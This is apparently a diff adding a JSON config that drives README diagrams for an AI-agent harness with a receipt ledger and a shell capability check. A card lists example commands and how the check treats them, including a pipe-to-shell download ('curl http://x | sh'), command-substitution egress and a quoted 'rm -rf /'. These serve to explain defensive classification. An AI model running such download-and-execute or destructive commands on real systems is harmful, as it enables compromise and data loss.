@@ -1,0 +1,56 @@
+{
+  "$comment": "Source of truth for the artwork on this repository's front page. Edit a sentence here and re-run scripts/render_repo_art.py; tests/test_repo_art.py fails if the committed SVG stops matching.",
+  "header": {
+    "name": "flywheel",
+    "role": "verified agent runs",
+    "tagline": "Run an AI task with any model. Keep a record you can recheck offline.",
+    "words": ["route", "check", "receipt", "ledger", "recheck"]
+  },
+  "flows": [
+    {
+      "file": "run-lifecycle.svg",
+      "kicker": "one run, end to end",
+      "title": "What happens to a task after you send it",
+      "alt": "Eight stages from task to offline recheck, with a refusal path back to the tool request, ending in match, changed or unverifiable.",
+      "footnote": "Every stage writes a receipt. The last stage needs no network and no model.",
+      "stages": [
+        {"title": "Task", "note": "Your prompt, and the model you picked from your own roster."},
+        {"title": "Route", "note": "Local or hosted. Keys are reported present or absent, never read out."},
+        {"title": "Tool request", "note": "The model asks to read, write, run a command, or call a companion tool."},
+        {"title": "Capability check", "note": "The request is classified, then allowed or refused before anything runs."},
+        {"title": "Execute", "note": "The allowed call runs. Its arguments and its output are hashed."},
+        {"title": "Receipt", "note": "Capability, outcome, both hashes, and the hash of the receipt before it."},
+        {"title": "Ledger", "note": "Receipts form an ordered chain. One broken link is visible from either end."},
+        {"title": "Recheck", "note": "Recompute the chain later with no network and no model in the loop."}
+      ],
+      "returns": [
+        {"from": 3, "to": 2, "label": "REFUSED, WITH THE REASON RETURNED TO THE MODEL"}
+      ],
+      "outcomes": [
+        {"label": "MATCH", "note": "the chain recomputes", "tone": "verified"},
+        {"label": "CHANGED", "note": "a link no longer agrees", "tone": "drift"},
+        {"label": "UNVERIFIABLE", "note": "the evidence is missing", "tone": "none"}
+      ]
+    }
+  ],
+  "cards": [
+    {
+      "file": "what-runs.svg",
+      "kicker": "the capability check, one command at a time",
+      "title": "What a shell command is allowed to do, and why",
+      "source": "python -c \"import harness.shell_admission as a; print(a.classify_command.__doc__)\"",
+      "alt": "Seven shell commands and what the capability check does with each of them. A dangerous word inside quotes is a printed string and runs, while the same word reached through a command substitution is found and blocked. A pipe records both of its capability classes even though one of them names the decision. An environment prefix does not hide the executable behind it. A command that will not parse is escalated to a person rather than admitted. The marked row is the honest gap: an executable the curated map has never seen is admitted, and written down as unknown.",
+      "footnote": "The decision names a capability class rather than a matched keyword, so it composes with the receipt written beside it. That trace carries the class, a reason code and a hash of the arguments, never the command itself. The map of names behind it is curated by hand and covers what it lists, nothing further.",
+      "heads": ["what is asked for", "what happens to it", "why it lands that way"],
+      "fields": [
+        {"key": "echo \"rm -rf /\"", "value": "runs, a string is printed", "note": "Quotes are parsed before capabilities are read, so the delete here is an argument to echo."},
+        {"key": "grep 'curl' notes.txt", "value": "runs, a search over a file", "note": "A denied name inside a quoted argument is text. Only the executable position is classified."},
+        {"key": "echo \"$(curl http://x)\"", "value": "blocked, network egress", "note": "The substitution runs first, so the tree is walked into and the outer echo settles nothing."},
+        {"key": "curl http://x | sh", "value": "blocked, both classes kept", "note": "Egress names the decision because it comes first. The download-and-run finding rides along in the record."},
+        {"key": "FOO=bar curl http://x", "value": "blocked, network egress", "note": "A variable set ahead of a command is a prefix. The walk steps over it and reads what follows."},
+        {"key": "echo \"unterminated", "value": "escalated, parse failed", "note": "Anything the parser cannot read is held back. A person sees it rather than a shell."},
+        {"key": "ls -la build/", "value": "runs, recorded as unknown", "tone": "drift", "note": "The map of names is curated and short. Anything absent from it is allowed so an oracle can work."}
+      ]
+    }
+  ]
+}
